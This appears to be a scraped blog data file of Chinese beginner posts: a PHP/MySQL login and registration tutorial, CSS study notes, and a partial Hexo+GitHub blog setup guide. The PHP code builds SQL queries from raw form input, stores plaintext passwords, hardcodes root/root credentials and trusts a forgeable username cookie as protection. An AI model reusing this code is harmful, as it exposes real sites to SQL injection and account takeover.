0;&#125;input &#123; width: 300px; height: 20px; margin-bottom: 10px;//margin-bottom 属性设置元素的下外边距 outline: none;//outline （轮廓）是绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用 padding: 10px;//padding 简写属性在一个声明中设置所有内边距属性,所有 4 个内边距都是 10px. font-size: 20px; color: #fff; text-shadow: 1px 1px 1px;//text-shadow属性向文本设置阴影 border-top: 1px solid #312E3D;//border-top 属性在一行声明中为上边框设置所有的属性 border-left: 1px solid #312E3D; border-right: 1px solid #312E3D; border-bottom: 1px solid #56536A; border-radius: 4px; background-color:#2D2D3F;&#125;.tj &#123; width: 300px; min-height: 20px; display: block; background-color: #4a77d4; border: 1px solid #3762bc;//border 简写属性在一个声明设置所有的边框属性 color: #fff; padding: 9px 14px; font-size:15px; line-height: normal;// border-radius: 5px; margin: 0px;&#125;.zc &#123; width: 300px; min-height: 20px; display: block; background-color: #33CC33; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size:15px; line-height: normal;//line-height 属性设置行间的距离（行高） border-radius: 5px; margin: 0px;&#125; 了解了这些属性，但还是不知道为啥大佬这样设置其中的一些数据，毕竟目前是小白，慢慢来吧。 我用的是CSS外部样式表,把CSS存到1.css文件中，在login.php（登陆页面）文件中引用。1&lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"1.css\"&gt; 这样，就完成了第一步！实现效果如下：在登陆页面加一个注册按钮 在1.css里面添加一段12345678910111213.zc &#123; width: 300px; min-height: 20px; display: block; background-color: #33CC33; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size:15px; line-height: normal;//line-height 属性设置行间的距离（行高） border-radius: 5px; margin: 0px;&#125; 实现效果：再做一个注册页面（Register.php），采用相同的CSS，换个颜色即可。Register.php代码如下：1234567891011121314151617181920&lt;?php?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请注册&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"3.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"Register\"&gt; &lt;h1&gt;Register&lt;/h1&gt; &lt;form action=\"Register link.php\" method=\"POST\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"请输入用户名\" /&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"请输入密码\" /&gt; &lt;br /&gt; &lt;button class=\"zc\" type=\"submit\"&gt;注册&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 实现效果如下：这样就实现了登陆页面和注册页面。 三：连接mySQL和设置COOKIE我们的登陆页面和注册页面都已经做好了，现在就来写一个PHP文件来连接数据库并且设置一下cookie.logincookie.php（连接数据库+设置cookie页面）代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php//第一次登陆的时候，通过用户输入的信息来确认用户header('Content-type: texy/html;charset=utf-8');//设置编码，防止乱码if ( ( $_POST['username'] != null ) &amp;&amp; ( $_POST['password'] != null ) ) &#123;//判断输入是否为空 $userName = $_POST['username'];//post方式接收传来的参数，用定义的$userName和$password接收 $password = $_POST['password']; //从数据库获取用户信息 //数据库连接信息 分别为主机 数据库用户名 密码 $conn = mysqli_connect('localhost','root','root'); mysqli_select_db($conn,'login');//连接所创建的login数据库 $sql = \"select * from user where username = '$userName'\";//从数据库表中获取数据 $res = mysqli_query($conn,$sql);//针对login这个数据库进行查询, 查询是否存在有这个用户名 $row = mysqli_fetch_array($res);//输出查询结果，传给$row if ($row['username']!=$userName) &#123; echo '不能登陆'; header('Location:fail.php'); &#125; else if($row['username']==$userName&amp;&amp;$row['password']!=$password) &#123; echo '不能登陆'; header('Location:fail.php'); &#125; else if($row['username']!=$userName&amp;&amp;$row['password']!=$password) &#123; echo '不能登陆'; header('Location:fail.php'); &#125; else if($row['username']==$userName&amp;&amp;$row['password'] ==$password) &#123; //如果密码验证通过，设置一个cookies，把用户名保存在客户端 setcookie('username',$userName,time()+3600);//设置一个小时 //最后跳转到登录后的欢迎页面 echo '登陆成功'; header('Location:welcome.php');//跳转到最后的欢迎页面 &#125;&#125;else &#123; echo '登陆失败'; header('Location:fail.php');//跳转到失败页面&#125; 这里面的PHP连接数据库语法，需要学习一下才能知道这些语句的意思。w3school网站这个网站特别好，特别详细，从这里面可以学习到PHP连接mySQL语法。123例如：mysql_connect(servername,username,password);//主机名、数据库用户名、密码//一般初始的数据库用户名和密码都是 root 语法学习会再总结一个单独的博客来记录一下，这里主要介绍一下搭建流程和遇到的问题。 通过PHP连接mySQL语法我们就可将用户输入的信息用POST方式传入到数据库中，然后利用查询语句进行查询数据库数据，进行比对，然后判断用户名和密码是否与数据库所存数据相同。 接下来实现cookie，一开始真的不知道有什么用处，查了一些博客，看了一些概念，就知道是把用户的信息存储到客户端，方便用户下次登入。但其实cookie也可以设置防绕过的功能，就例如：如果我不设置cookie，那么我的登陆页面和最终页面都是独立的，靠的也只是HTML中的&lt;form action=&quot; &quot;&gt; 来连接进行跳转功能。但这样不安全，如果对方注册一个用户，登陆到你的最终页面，可以直接在url地址栏里直接输入这个文件，例如我的最终页面是welcome.php，对方一输入没有如何阻拦，直接就可以进入。所以设置cookie的作用不仅是把用户的信息保存在客户端，更重要的防止绕过。 cookie的具体介绍可以看一下B站孙胜利老师的讲解的和菜鸟教程官网上的介绍，特别详细。 一开始模仿大佬做，设置了两个cookie，一个是用户名的。另一个是密码的，但已经写过注销cookie了PHP文件却依旧能在url地址栏里直接进入后台，一开始真的不知道错误点在那，搞了很长时间，但这个过程及其有意思，查资料，问朋友，自己修改代码。最后发现。。。，其实完全不用设置密码的cookie了，我设置用户名cookie的前提便是用户名输入和数据库密码相等了，所以只要设置一个用户名cookie，便能够识别和登陆。也可以在注销cookie时，把密码的cookie注销，之前直接能登入后台就是因为我设置了两个cookie，却只清除了一个。。。 找到问题所在就可以成功设置好cookie，并且注销cookie了。 四：实现登陆功能和注销cookie在上面我们实现了两个页面，一个是登陆页面，一个连接数据库+cookie的，下面我们还需要两个页面。一个登陆失败页面（fail.php）代码如下： 1234567891011121314151617&lt;?php?&gt; &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt; &lt;title&gt;登陆失败&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"2.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"login\"&gt; &lt;h1&gt;请重新登陆&lt;/h1&gt; &lt;/div&gt; &lt;a href=\"login.php\"&gt;重新登陆&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 可以看logincookie.php的代码中，如果用户名和密码有一个不正确的时候，都会跳转到fail.php页面。实现效果：下面我们再实现一个用户登陆成功的页面（welcome.php）代码如下：1234567891011121314151617181920&lt;?php if(!isset($_COOKIE['username']))&#123;//如果cookie没有设置，则不能登陆。 echo '不能登陆'; exit(); &#125;?&gt;//上面的代码便是设置cookie的作用便用于此，这样便可防止直接登入后台&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请登陆&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"4.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"Landingsuccessfully\"&gt; &lt;h1&gt;Landingsuccessfully&lt;/h1&gt; &lt;a href=\"end.php\"&gt;Please cancel&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 实现效果：直接从url里面登陆，显示结果：正常用户登陆，显示结果：因为我设置的cookie是一个小时的，我们需要手动清除一下cookie，否则客户端会保留cookie，下次在url里直接可以登陆后台。 所以再写一个注销cookie的页面（end.php）代码如下：12345678&lt;?php ini_set(\"error_reporting\",\"E_ALL &amp; ~E_NOTICE\"); header('Content-type:text/html;charset=utf-8');if (isset($_COOKIE['username'])) &#123; setcookie('username',$userName,time()-3600); echo '注销成功';&#125;?&gt; 之前这个页面老是报错，大致便是Notice:Undefined varialbe:变量名称，但注销功能能正常实现，加上 ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); 便可以解决报错问题，查资料发现。在4.3.0中运行正常，在4.3.1中运行会提示Notice:Undefined varialbe:tmp_i修改方法：在程序开头加一句：error_reporting(E_ALL &amp; ~E_NOTICE); 或error_reporting(E_ALL ^ E_NOTICE);具体查看：报错原因和修改方法 这样就实现了cookie注销的功能了实现效果 ：进行一下测试，看是否清除cookie。在url地址栏里直接登陆后台试试ok,看来确实注销成功了，完成咯。 五：实现注册功能登陆功能也完全实现了，接下来我们就实现一下注册功能。这里我们又写了三个页面（好乱），不过毕竟是小白，只要能写出来就行。首先是注册页面（Register.php）代码如下： 1234567891011121314151617181920&lt;?php?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请注册&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"3.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"Register\"&gt; &lt;h1&gt;Register&lt;/h1&gt; &lt;form action=\"Register link.php\" method=\"POST\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"请输入用户名\" /&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"请输入密码\" /&gt; &lt;br /&gt; &lt;button class=\"zc\" type=\"submit\"&gt;注册&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 接下来是连接数据库(linkmysql.php)代码如下：123456&lt;?php header(\"Content-type: text/html; charset=utf-8\");//设置编码,防止乱码 $con = mysql_connect(\"localhost\",\"root\",\"root\") or die(\"数据库连接失败\"); mysql_select_db('login') or die(\"指定的数据库不能打开\"); mysql_query(\"set names utf8\");?&gt; 再就是导入信息的页面（Register link.php）代码如下：123456789101112131415161718192021222324252627282930&lt;?php require_once(\"linkmysql.php\");//首先连接数据库 $name=trim($_POST['username']); //trim函数，过滤空格，使用trim函数，我们可以把表单中空格给过滤掉 $password=$_POST['password']; $sql = \"select * from user where username='$name'\";//从数据库查找用户名数据 $info = mysql_query($sql);//函数执行一条 MySQL 查询 $res = mysql_num_rows($info);//返回一行的结果 if(empty($name))&#123;//empty() 函数用于检查一个变量是否为空。 echo \"&lt;script&gt;alert('用户名不能为空');location.href='login.php';&lt;/script&gt;\"; &#125;else if(empty($password))&#123; echo \"&lt;script&gt;alert('密码不能为空');location.href='login.php';&lt;/script&gt;\"; &#125;else&#123; if($res)&#123; echo \"&lt;script&gt;alert('用户名已存在');location.href='login.php';&lt;/script&gt;\"; &#125;else&#123; $sql1 =\"insert into user(username,password) values('\".$name.\"','\" .$password.\"')\";//PHP MySQL 插入数据 $result = mysql_query($sql1);//判断插入数据是否成功 if($result)&#123; echo \"&lt;script&gt;alert('注册成功')&lt;/script&gt;\"; header('Location:login.php'); &#125;else&#123; echo \"&lt;script&gt;alert('注册失败')&lt;/script&gt;\"; &#125; &#125;&#125; ?&gt; 这样就实现了注册功能。这里面涉及了数据库的PHP mySQL插入的语法，可以在菜鸟教程学习，之后再写一篇总结一下这些语句的用法。 🆗，到此为止我们就实现了简易的登陆注册页面。 虽然这个项目很小，但做出了真的很有成就感，同时觉得学习的东西真的好有意思，加油，继续努力学习（开心！！！）。","categories":[],"tags":[{"name":"HTML","slug":"HTML","permalink":"http://bealright.github.io/tags/HTML/"}]},{"title":"CSS学习总结","slug":"CSS学习总结","date":"2019-03-18T06:38:24.000Z","updated":"2019-06-07T07:53:47.409Z","comments":true,"path":"2019/03/18/CSS学习总结/","link":"","permalink":"http://bealright.github.io/2019/03/18/CSS学习总结/","excerpt":"","text":"CSS学习总结CSS定义及三种引入方式 CSS是一种层叠样式表直接放在div标签里面 第一种：内敛样式表12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"color:red;width:100px;height:100px;\"&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 第二种：内部样式表 在里面引用标签要建立联系 需要一个选择器123&lt;style&gt;选择器&#123;选择器的内容&#125;&lt;/style&gt; 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;style&gt; div &#123;color: red;width: 100px;height: 100px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 第三种：外部样式表 用一个文件 将这些属性放在文件里面例如：建立一个1.css文件 在新建的文件中放入：12345 div &#123;color: red;width: 100px;height: 100px;&#125; 把这些放入这个文件中在原来的文件里引用标签 href属性填入新建的CSS文件1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;link rel=\"stylesheet\" href=\"1.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 实现结果： CSS语法外部样式表 选择器 { 属性名称：属性值；}12css注释方法：/*注释*/ 颜色rgb色彩模式：R 红色 由浅到深 0—255G 绿色b 蓝色 例如：12345div &#123; width: 100px; height: 100px； color: rgb(225,0,0)；&#125; 同样也可以用百分比进行替换如：12345div &#123; width: 100px; height: 100px； color: rgb(100%,0%,0%)；&#125; 第二种:用颜色名称除此之外，还可以用十六进制代表颜色例如：1234567891011 &lt;p style=\"background-color:#FFFF00\"&gt;16进制&lt;/p&gt;&lt;p style=\"background-color:rgb(255,255,0)\"&gt;RGB&lt;/p&gt;&lt;p style=\"background-color:yellow\"&gt;颜色名称&lt;/p&gt; 实现结果： CSS基本选择器 选择器的作用：通过选择器 可以找到HTML的元素 并且把选择器后面样式传递给元素。四大类选择器：基本选择器组合选择器属性选择器伪元素选择器 基本选择器一 通配符选择器二 标签选择器 比如div三 id 选择器四 class选择器 一：通配符选择器1234*&#123; border: 1px solid balck;&#125;&lt;!--* 可以选择所有的html标签--&gt; 例如：在CSS.html文件中12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;link rel=\"stylesheet\" href=\"2.css\"&lt;/head&gt;&lt;body&gt; &lt;div&gt;div1 &lt;div&gt;div2&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 在2.CSS文件里123*&#123; border: 1px solid black; &#125; 这是外部样式表实现结果为：二：标签选择器例如：我只选择标签在2.CSS文件中123p&#123; border: 1px solid black; &#125; 实现结果：三：id选择器在CSS.html中123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;link rel=\"stylesheet\" href=\"2.css\"&lt;/head&gt;&lt;body&gt; &lt;div&gt;div1 &lt;div&gt;div2&lt;/div&gt; &lt;p id=\"wo\"&gt;p1&lt;/p&gt; &lt;!--id后面取一个名称--&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 在2.CSS中123456#wo &#123; font-size: 60px; &#125;&lt;!--#加上名称就会选择对应的标签，一一对应--&gt;注意事项：&lt;!--id名称不要在一个文件里重复出现--&gt; 实现结果：四：class标签1234567在CSS.html中&lt;p class=\"wo\"&gt;p2&lt;/p&gt;在2.CSS中.wo &#123; font-size: 60px; &#125;&lt;!-- .就代表了class--&gt; 实现结果：12345678910&lt;!--class标签不具有唯一性--&gt;在CSS.html中&lt;p class=\"wo wo2\"&gt;p2&lt;/p&gt;在2.CSS中.wo &#123; font-size: 60px; &#125;.wo2 &#123; color: red;&#125; CSS原理 优先原则后解析的内容 会覆盖掉之前解析的内容 1.对于同一个选择器：文件执行的顺序是从上往下执行。例如：1234div&#123; color：red; color: green;&#125; 最终文本的颜色是绿色 2.同一类型的选择器：从上往下例如：1234567891011在创建html文件中&lt;body&gt; &lt;div&gt;div1&lt;/div&gt;&lt;/body&gt;在创建CSS文件中div &#123; background-color: red;&#125;div &#123; background-color: green;&#125; 最终的背景色显示是绿色1234567891011在创建的html文件中&lt;body&gt; &lt;div class=\"bg1 bg2\"&gt;div1&lt;/div&gt;&lt;/body&gt;在创建CSS文件中.bg1&#123; background-color: yellow;&#125;.bg2&#123; background-color: green;&#125; 最终显示的背景色是绿色 3.不同类型的选择器：选择器本身具有优先级如：*&lt;div&lt;class&lt;id规则：先解析 低优先级的再解析高优先级的1234567891011在创建的html文件中&lt;body&gt; &lt;div class=\"bg1\"&gt;div1&lt;/div&gt;&lt;/body&gt;在创建的CSS文件中.bg1&#123; background-color: green;&#125;div&#123; background-color:red;&#125; 最终div1的背景色是绿色4.外部样式 内部样式 合并之后一起解析先外部样式 再内部解析例如：12345678910111213例如在html文件中&lt;style&gt;div &#123; background-color: red;&#125;&lt;/style&gt;在CSS文件中div&#123; background-color:yellow;&#125;div &#123; background-color: green;&#125; 先合并起来在按照同一类型的选择器：从上往下执行。最终显示的背景色是红色 5.加了important 字段的，最后再执行.12345678div&#123; background-color: green! important;&#125;最后再执行。div &#123; background-color: yellow; font-size: 30px;&#125; 继承原则嵌套里面的标签 拥有外部标签的某些样式 跟文字、文本相关的样式是可以被继承123456789101112&lt;body&gt; &lt;div class=\"txt\"&gt;div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;在CSS文件中div.txt &#123; color: red;/* 文字的颜色*/&#125; &lt;!--跟文本 文字相关的内容会继承CSS文件中的颜色--&gt; CSS组合选择器 把基本选择器通过特殊的符号串在一起，形成一定的意义。 分组选择器用逗号将标签隔开1234567891011121314在html中&lt;body&gt; &lt;div&gt;div1&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中div &#123; background: green;&#125;p &#123; background: green; color: red; font-size: 50px;&#125; 为了节省代码量，可以使用分组选择器，实现相同的效果1234567div,p &#123; background：green; color: red;&#125;p &#123; font-size: 50px;&#125; 嵌套选择器空格隔开例如 : p是嵌套在div里面1234567891011121314151617在html中&lt;body&gt;&lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt;&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt;在CSS中div p&#123; background: green; color: red; font-size: 50px;&#125; p2 p3都会显示出这些属性，而p1不会,因为p1没有嵌套在div标签内。 子选择器标签&gt;标签例如：1234567891011121314151617在html中&lt;body&gt;&lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt;&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt;在CSS中div&gt;p&#123; background: green; color: red; font-size: 50px;&#125; 因为p2的父标签是div，所以CSS的属性可以实现，p3,p1的父标签不是,所以不能实现CSS中的属性。 相邻同级选择器例如：1234567891011121314151617在html中&lt;body&gt;&lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt;&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt;在CSS中div+p&#123; background: green; color: red; font-size: 50px;&#125; 可以看到div和 最下面的p标签同级，因此只有p1这个p标签会生效 CSS属性选择器基本选择器【属性】 123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS文件中P[title=wo]&#123; background: green; color: red; font-size: 50px;&#125; 实现结果：只有p1显示出CSS的属性 属性里面的值可以放多个【属性~=值】代表多个值123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"wo2 cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo cc\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中P[title~=wo]&#123; background: green; color: red; font-size: 50px;&#125; 只要title包含有wo的就生效。因此只有p1生效 【属性^=值】 开始123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"wo2 cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo cc\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中P[title^=wo]&#123; background: green; color: red; font-size: 50px;&#125; 实现结果：title的值是以wo开头的，所以p3 p1都会生效 【属性$=值】 结束123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"wo2 cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo cc\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中P[title$=cc]&#123; background: green; color: red; font-size: 50px;&#125; 实现结果：因为p3 p1 title属性的结尾都是CC，故p3和p1都会实现CSS中的属性 伪元素选择器 不是自己写的HTML文件中自带开始：before结束：after 12345678910111213141516在HTML文件中&lt;body&gt; &lt;p title=\"wo cc\"&gt; &lt;!--&lt;before&gt;--&gt;隐藏的 p1 &lt;!--&lt;after&gt;--&gt; &lt;/p&gt;&lt;/body&gt;在CSS文件中可以改变内容，添加样式p::before &#123; content: \"before\";&#125;p::after &#123; content: \"after\";&#125; 实现的结果为：before p1 after 块元素 第一个字母 first-letter 第一行： first-line 1234567891011在html文件中&lt;body&gt; &lt;p&gt; 这是一段文字 &lt;/p&gt;&lt;/body&gt;在CSS文件中p::first::letter &#123; color: red; font-size: 100px;&#125; 实现结果:第一个字变红放大12345同理p::first::line&#123; color: red; font-size: 100px;&#125; 实现结果:这一段文字变红放大 CSS背景12345在CSS文件中body &#123; background-color: red;//添加背景颜色 background-image: url('图片地址')；//添加背景图片&#125; 实现结果：一个图片是重复铺满整个网页也可以设置平铺的方向1234567body &#123; background-color: red; background-image: url(''); background-repeat: repeat-x//图片沿着X方向平铺 background-repeat: repeat-y//图片沿着T方向平铺 background-repeat: no-repeat;// 只有一张图片，不会进行平铺&#125; 在网页中移动图片12345body &#123; x 轴 y轴 background-position: 100px 100px;也可以表示为 background-position: 50% 0%；&#125; 同样也可以这样12345x轴： left center righty轴： top center bottombody &#123; background-position: center top;&#125; 设置图片不滚动123body &#123; background-attachement: fixed;&#125; 这样背景图片就会保持不动，如果不设置则默认为滚动。 也可以写成这样1background: color image repeat attachment position 按照这样的顺序，就可以节省很多代码量例如：1background: red url('') repeat-y; CSS字体设置字体在CSS文件中 1234567body &#123; font-family: \"黑体\"，\" 宋体\"；//多个字体的话用逗号隔开 font-size: 30px;//设置字体大小，如果不设置系统默认是16px的 font-weight: 100~900//设置字体粗细 &lt;!--一般情况下是不会写数字的，用三个单词代替，分别为normal\\lighter（字号更细）\\bold(字号更粗) font-style: normal;(正常的字体) italic(斜体)&#125; 上面的代码也可以用一行代码进行表示12345678body &#123; font: style weight size/line-height font-family&#125;例如;body &#123; font: italic bold 30px/150px \"微软雅黑\"，\"黑体\"；&#125;line-height：字体的行高 CSS文本设置字符的间距 12345678910&lt;body&gt; &lt;p class=\"txt\"&gt;hello world 这是第一段字&lt;/p&gt;&lt;/body&gt;在CSS文件中.txt &#123; letter-spacing: 0px; &lt;!-- 像素也可以设置为负的--&gt;&#125; 这样就可以设置字符的间距 设置空格的距离1234567891011在html文件中&lt;body&gt; &lt;p class=\"txt\"&gt;hello world 这是第一段字&lt;/p&gt;&lt;/body&gt;在CSS文件中.txt &#123; word-spacing: 0px; &lt;!-- 像素也可以设置为负的--&gt;&#125; 这样就可以设置空格的距离还有一个方法设置字符的间距1direction: ltr; &lt;!--ltr代表的意思即为 left to right--&gt; 在CSS文件中123456 p &#123; text-decoration: line-through; &lt;!--线穿过文字--&gt; overline;&lt;!--线在文字上方--&gt; underline;&lt;!--线在文字下方--&gt;&#125; 例如;123p &#123; text-decoration: line-through;&#125; 文字对齐方式 center(居中对齐) left(左对齐) right(右对齐) justify(两端对齐)默认状态下就是左对齐例如：1234在CSS文件中p &#123; text-align: left;&#125; 这样html文件中p标签的内容便会左对齐 缩进设置123p &#123; text-indent: 60px;&#125; 英语大小写字母设置12345678p &#123; text-transform: uppercase; &lt;!--uppercase是改为全大写--&gt; text-transform: lowercase; &lt;!--lowercase是改为全小写--&gt; text-transform: capitalize; &lt;!--capitalize是改为首字母大写--&gt;&#125;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://bealright.github.io/tags/CSS/"}]},{"title":"搭建属于自己的博客","slug":"hexo+githup搭建属于自己的博客","date":"2019-03-12T01:34:24.000Z","updated":"2019-06-07T07:53:24.993Z","comments":true,"path":"2019/03/12/hexo+githup搭建属于自己的博客/","link":"","permalink":"http://bealright.github.io/2019/03/12/hexo+githup搭建属于自己的博客/","excerpt":"","text":"hexo+githup搭建属于自己的博客 第一次搭建博客，遇到不少坑。CSDN、bing、谷歌、百度上都有大神的博客教授如何一步一步搭建属于自己的博客。不过我毕竟属于小白，文字有时给我的感受不是那么的直观，所以我是在B站看视频一步一步做的.话说他们的视频都写无坑视频。。。我却遇到了。。。很多坑，但觉得也很有趣，所以记录一下我的搭建过程。 安装node.js 官网链接选择10.15.3LTS进行下载。我是一路next,我开始搭的时候不想放入C盘，但后来发现npm命令不能用😂，才发现还要改路径，很麻烦。所以就一路next放进C盘中去。安装好后，打开cmd 12C:\\Users\\用户名&gt;node -vv10.15.3 即证明已经安装好了。 2 创建github账户 github官网username不要起中文名，起一个英语名字，也不要太过于长，否则都后面会很麻烦。创建完成后点击start a project,创建一个仓库。Repository name 要写成这样的格式username.github.io,例如我用户名创建时bealright.github.io,然后将Initialize this repository with a README前面的对勾打上。点击create repository就创建好了。接下你可以测试一下，点击create new file.,输入index.html，输入&lt;h1&gt; Hello Github &lt;/h1&gt;.然后提交。复制你的链接用户名.github.io，然后转到该页面上去。如果显示出Hello Github，证明你创建的已经成功。如果显示404（所请求的页面不存在或已被删除!），不要着急，我当时被困在这里，毕竟刚开始搭，什么都不懂。在这里一直查怎么回事，删除仓库，重新建库。。。😂😂，到最后我明白了一个真理。。。时间skr伟大的作者，他必将写出最完美的结局 解决方法：问题出在Github服务器上，估计是翻墙什么的缘故吧，会卡一些，你创建的文件不会立即上传过去，要做的就是好好睡一觉明天在搭（因为我是晚上搭的😂），所以遇到这个问题不要着急。 3 安装git for windows git for windows官网因为git for windows是输入外国网站，你必须翻墙去下载，但是速度会特别慢，所以推荐去百度网盘什么的下载，会快一些。我当时找了一个很不错的网址，各种版本的都有。下载地址安装时一路next,我直接放在的C盘中，因为如果出现路径问题会很麻烦，你还得去设置环境变量。在安装的时候，其中有一步要选择Use windows default console window。安装好后打开cmd。输入git 命令。 12345678910111213141516171819202122232425262728293031323334353637383940414243C:\\Users\\赵志豪&gt;gitusage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value] [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path] [-p | --paginate | --no-pager] [--no-replace-objects] [--bare] [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;] &lt;command&gt; [&lt;args&gt;]These are common Git commands used in various situations:start a working area (see also: git help tutorial) clone Clone a repository into a new directory init Create an empty Git repository or reinitialize an existing onework on the current change (see also: git help everyday) add Add file contents to the index mv Move or rename a file, a directory, or a symlink reset Reset current HEAD to the specified state rm Remove files from the working tree and from the indexexamine the history and state (see also: git help revisions) bisect Use binary search to find the commit that introduced a bug grep Print lines matching a pattern log Show commit logs show Show various types of objects status Show the working tree statusgrow, mark and tweak your common history branch List, create, or delete branches checkout Switch branches or restore working tree files commit Record changes to the repository diff Show changes between commits, commit and working tree, etc merge Join two or more development histories together rebase Reapply commits on top of another base tip tag Create, list, delete or verify a tag object signed with GPGcollaborate (see also: git help workflows) fetch Download objects and refs from another repository pull Fetch from and integrate with another repository or a local branch push Update remote refs along with associated objects'git help -a' and 'git help -g' list available subcommands and someconcept guides. See 'git help &lt;command&gt;' or 'git help &lt;concept&gt;'to read about a specific subcommand or concept. 出现一堆看不懂的就证明已经安装成功了。 4 配置githubSSH 找到下载git fow windows的目录，打开git-bash.exe在命令行输入$ ssh-keygen -t rsa -C &quot;你的邮箱&quot;输入之后，一直按回车就🆗了。等到出现一个长方形框之后，就已经配置好了。然后打开GitHub官网，点击头像，点击Settings,再点击SSH and GOG keys,点击NEW SSH KEY ,这时title就起名为你注册的用户名，然后key需要你找到C:\\Users\\用户名\\.ssh这个目录，注意这里用记事本打开id_rsa.pub,复制里面的代码，粘贴到key上即可。这样就配置好了。 5 hexo本地使用 进入hexo官网注意 